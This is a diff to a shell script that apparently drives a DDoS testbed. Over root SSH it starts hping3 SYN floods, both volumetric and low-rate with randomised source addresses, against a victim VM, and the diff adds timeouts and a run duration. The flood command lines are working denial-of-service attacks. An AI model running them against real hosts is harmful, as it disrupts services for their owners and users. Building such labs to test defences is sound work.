@@ -139,13 +139,13 @@ signal_attacker() {
 
   case "$attack_type" in
     volumetric)
-      ssh -o StrictHostKeyChecking=no root@"$ATTACKER_IP" \
-        "nohup hping3 -S -p 80 --flood $VICTIM_IP > /tmp/attack.log 2>&1 &
+      ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@"$ATTACKER_IP" \
+        "nohup timeout $DURATION hping3 -S -p 80 --flood $VICTIM_IP > /tmp/attack.log 2>&1 &
          echo \$! > /tmp/attack.pid" || log "[WARN] Could not SSH to attacker"
       ;;
     low-rate)
-      ssh -o StrictHostKeyChecking=no root@"$ATTACKER_IP" \
-        "nohup hping3 -S -p 80 --rand-source -i u10000 $VICTIM_IP > /tmp/attack.log 2>&1 &
+      ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@"$ATTACKER_IP" \
+        "nohup timeout $DURATION hping3 -S -p 80 --rand-source -i u10000 $VICTIM_IP > /tmp/attack.log 2>&1 &
          echo \$! > /tmp/attack.pid" || log "[WARN] Could not SSH to attacker"
       ;;
     adversarial)
@@ -160,9 +160,9 @@ signal_attacker() {
 
 stop_attacker() {
   log "Stopping attack on VM1 …"
-  ssh -o StrictHostKeyChecking=no root@"$ATTACKER_IP" \
+  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@"$ATTACKER_IP" \
     "kill \$(cat /tmp/attack.pid 2>/dev/null) 2>/dev/null; rm -f /tmp/attack.pid" \
-    || log "[WARN] Could not stop attacker"
+    || log "[WARN] Could not stop attacker (auto-timeout will handle it)"
 }
 
 verify_active_response() {
